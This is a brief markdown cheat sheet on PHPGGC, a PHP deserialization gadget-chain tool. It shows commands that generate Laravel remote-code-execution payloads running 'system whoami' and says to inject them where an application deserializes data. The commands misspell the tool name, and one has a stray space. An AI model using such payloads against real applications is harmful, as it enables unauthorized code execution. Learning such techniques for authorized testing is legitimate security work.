# PHP Gadget Chain PHPGCC

## Link: https://github.com/ambionics/phpggc

### Usage:

 - 1) List all available gadget chains
  
          ./phpgcc -l
 
 - 2) List all available gadget chains within a specific framework
  
          ./phpgcc -l laravel

 - 3) Generate a base64 encoded serialized payload
  
          ./phpgcc -b Laravel/RCE4 system whoami

 - 4) Generate a non-encoded serialized payload
  
          ./ phpgcc Laravel/RCE4 system whoami

### Then use our crafted payload to a place where the application handles serialized/deserialized data to inject.
